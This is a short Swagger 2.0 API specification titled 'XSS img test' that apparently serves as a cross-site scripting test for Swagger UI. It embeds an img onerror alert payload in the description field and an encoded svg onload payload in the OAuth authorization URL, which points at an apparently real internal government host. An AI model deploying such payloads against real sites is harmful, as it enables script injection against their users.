swagger: '2.0'
securityDefinitions:
  a:
    type: oauth2
    flow: implicit
    authorizationUrl: "https://wienki.intern.wien.gv.at/auth?next=%22%3E%3Csvg/onload=alert('XSS')%3E"
    scopes:
      read: "Read access"
info:
  version: "1.0.0"
  title: XSS img test
  description: "<img src=x onerror=alert('XSS in Swagger UI')>"
paths:
  /:
    get:
      responses:
        200:
          description: Successful response